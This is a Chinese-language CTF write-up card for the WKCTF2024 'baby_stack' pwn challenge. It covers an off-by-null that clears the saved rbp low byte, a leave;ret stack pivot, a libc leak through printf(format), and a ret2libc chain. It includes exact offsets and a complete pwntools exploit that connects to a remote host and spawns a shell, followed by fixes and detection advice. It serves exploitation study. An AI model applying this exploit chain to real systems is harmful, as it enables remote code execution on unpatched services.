---
id: ctf-pwn-offbynull-stack-migration-format-leak-ret2libc
title: WKCTF2024 baby_stack：echo_inner off-by-null 改 rbp 低字节栈迁移 + 格式化字符串泄 libc + ret2libc
type: scenario
domain: ctf
path: ctf/pwn
technique: offbynull-stack-pivot-format-leak-ret2libc
aliases:
- WKCTF2024 baby_stack
- echo_inner off_by_null
- leave ret 栈迁移
- 格式化字符串泄 libc
- baby_stack
tags:
- ctf
- pwn
- stack
- off-by-null
- stack-pivot
- format-string
- ret2libc
- libc227
cve: []
severity: high
confidence: medium
affected_versions: libc 2.27（题目提供 libc-2.27.so）
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V294
  verified_at: '2026-11-08T08:01:14+08:00'
  notes: 已对照原文与13张图核对：图10 echo_inner input[fread(...)]=0 off-by-null；图11 func() 为 getc(stdin)+fgets(s,5)+snprintf(%d%llx)+printf(format)（原卡误写 gets(s)，已改为 getc(stdin)）；图12 exp 爆破栈迁移成功 cat flag。PoC 与原文一致。dup-scan pair#139 与 binary-pwn-stack-ret2gets-stdfile-lock-tls-leak 为 related：本卡是 off-by-null 改 rbp 低字节栈迁移+格式串泄露，对方是 ret2gets 读 TLS 指针，非同一链，保留。未连接原文远程目标、未复跑 exp。
---

## 一句话结论

`echo_inner` 在 `input[(int)fread(input, 1, len, stdin)] = 0` 处多写一个 NUL；当读满栈缓冲区时，这个 NUL 会清掉保存的 `rbp` 低字节，函数返回时 `leave; ret` 把栈迁移到攻击者可控区域；先用 `func()` 里 `printf(format)` 的格式化字符串泄露 libc，再在迁移后的栈上布置 `ret` 对齐 + `pop rdi` + `/bin/sh` + `system` 的 ret2libc 链。

## 原理

- **off-by-null 的位置**：`echo_inner` 先用 `fread(input, 1, len, stdin)` 读入最多 `len` 字节，然后在 `input[fread 返回值] = 0` 补 NUL。如果 `len` 正好等于缓冲区大小，NUL 就写到缓冲区末尾之外，覆盖相邻的栈变量/保存的 `rbp` 最低字节。GCC 编译的 64 位栈帧中 `rbp` 低字节通常与栈对齐相关，清零后 `leave`（`mov rsp, rbp; pop rbp`）会落到一个略低的、可能被攻击者控制的栈地址。
- **为什么能栈迁移**：函数 epilogue 是 `leave; ret`；`rbp` 被改后，`leave` 把 `rsp` 设到新位置，`ret` 从那里取返回地址。攻击者先通过输入把一块可控数据放在该位置的“下方/上方”，让 `leave; ret` 把执行流带到这块数据；文章用多次 `ret` 做栈对齐，再用 `pop rdi`/`system` 完成 ret2libc。由于 `rbp` 低字节只有有限取值，文章提示“需要爆破一下”，即重连/重试直到迁移地址落在 payload 上。
- **格式化字符串泄露**：`func()` 里 `char s[5]; char format[120]; getc(stdin); fgets(s,5,stdin); v0 = strtol(s,0,10); snprintf(format,0x64,"Your magic number is: %%d%llx\n", v0); printf(format);`。`%%d` 在 `snprintf` 后变成字面 `%d`，`%llx` 被替换成 `v0` 的十六进制；随后 `printf(format)` 把 `%d` 当成格式符但没有对应参数，从栈/寄存器读取并打印一个值。文章发送 `27` 触发后，从 `Your magic number is: ` 后读取 6 字节十六进制，减去 `__libc_start_main` 与偏移 `231` 得到 libc 基址。
- **为什么需要 libc 基址**：二进制开启 PIE，但 payload 只用 libc 内的 `ret`/`pop rdi`/`system`/`/bin/sh`，不依赖 PIE 基址；拿到 libc 基址后即可计算这些地址。
- **利用顺序**：先触发格式化泄露拿 libc，再发送长度 `256` 与 256 字节 payload；payload 前 0xb0 为 NUL，随后 `ret`×2（对齐）、`pop rdi`、`/bin/sh`、`system`。off-by-null 把 `rbp` 低字节清零后，`leave; ret` 迁移到 payload 区域执行 ret2libc。

## 触发条件

- 目标为 64 位 Linux PIE 二进制，提供 libc-2.27.so；`echo_inner` 的 `fread` 长度可由用户控制且未预留 NUL 位置。
- 栈布局允许 off-by-null 覆盖保存的 `rbp` 低字节，且 `leave; ret` 能落到可控缓冲区；需要多次重试（rbp 低字节/栈对齐随机）。
- 程序存在可控格式串的 `printf(format)`（或可泄露栈/libc 指针的等价输出），能在栈迁移前拿到 libc 基址。
- 可多次连接/交互，因为栈迁移的爆破需要重试。

## 利用步骤

1. 连接目标，选择 echo 功能，发送 `'1'`；按提示发送较小数字（文章 `'27'`）触发 `func()` 的格式化输出。
2. 从 `Your magic number is: ` 后读取 6 字节十六进制（文章 `p.recv(6*2)`），按 `libcbase = leak - libc.sym['__libc_start_main'] - 231` 计算 libc 基址。
3. 计算 `ret = libcbase + 0x8aa`、`pop_rdi = libcbase + 0x2164f`、`system = libcbase + libc.sym['system']`、`binsh = libcbase + next(libc.search(b'/bin/sh'))`。
4. 发送 `'256'` 作为长度；构造 `payload = b'\x00'*0xb0 + p64(ret)*2 + p64(pop_rdi) + p64(binsh) + p64(system)`，补齐到 256 字节后发送。
5. off-by-null 触发后 `leave; ret` 迁移到 payload；若未成功（连接断开/无 shell），重连并重试（rbp 低字节熵）。
6. 进入交互后 `cat flag` 读取 flag（文章得到 `WKCTF{...}`）。

## PoC

```python
from pwn import *
p = remote('110.40.35.73', 33779)
libc = ELF('./libc-2.27.so')

p.send(b'1')
p.sendline(b'27')
p.recvuntil(b'is: ')
libc_add = int(p.recv(6 * 2), 16)
libcbase = libc_add - libc.sym['__libc_start_main'] - 231
print(hex(libcbase))

p.sendline(b'256')
ret = libcbase + 0x8aa
pop_rdi = libcbase + 0x2164f
system = libcbase + libc.symbols['system']
binsh = libcbase + next(libc.search(b'/bin/sh'))

payload = b'\x00' * 0xb0 + p64(ret) * 2 + p64(pop_rdi) + p64(binsh) + p64(system)
payload = payload.ljust(256, b'\x00')
p.sendlineafter(b'max', payload)
p.interactive()
```

## 变体与关联

- **off-by-null 位置变体**：`fread`/`read` 后补 NUL、`strcpy`/`strcat` 的终止符、循环多写 1 字节；关键都是“边界外 1 字节”改到保存的 `rbp`/返回地址/长度字段。
- **迁移方式变体**：`leave; ret` 到栈上 payload；改 `rbp` 指向 BSS/堆上的 ROP；用 `pop rsp`/`xchg rsp` gadget；多次 `ret` 对齐。
- **泄露变体**：`printf(format)` 的 `%d`/`%p`；`puts`/`write` 泄 GOT；格式化串 `%N$p` 直接定位栈/libc。
- **关联**：[[binary-pwn-stack-pivot-leave-ret-bss]]（leave;ret 迁到 BSS）、[[binary-pwn-format-string-canary-libc-leak-rop-system]]（格式化串泄 canary/libc + ROP）、[[ctf-pwn-blind-negative-length-stack-leak-debug-write-ret2libc]]（栈泄露 + ret2libc）、[[binary-pwn-stack-canary-lowbyte-nul-overwrite-string-leak]]（低字节 NUL 覆盖类栈泄露）。
- **边界**：若编译器插入栈保护/`-fstack-protector` 且 off-by-null 触发 canary，需先泄 canary；若 `rbp` 低字节清零后落入不可控区域，爆破无法成功；PIE + 无 libc 泄露时需先泄 libc。

## 检测与防御

- **代码修复**：`fread(input, 1, len - 1, stdin)` 并确保缓冲区足够；不要用用户可控长度直接做 `input[n] = 0`；用 `fgets`/`read` + 显式长度校验。
- **格式化串**：`printf("%s", input)` 或 `puts(input)`，不要 `printf(input)`；动态格式串必须来自固定模板。
- **编译加固**：启用 PIE、栈保护、`_FORTIFY_SOURCE`、CET；ASLR 保证栈/libc 随机化。
- **检测**：崩溃/重连频率异常（爆破 rbp 低字节）、`printf` 输出中出现非预期栈/libc 指针、进程执行 `/bin/sh`。
- **说明**：本文为 CTF/授权环境利用，偏移与栈布局依赖题目二进制与 libc；换题需重新核对。
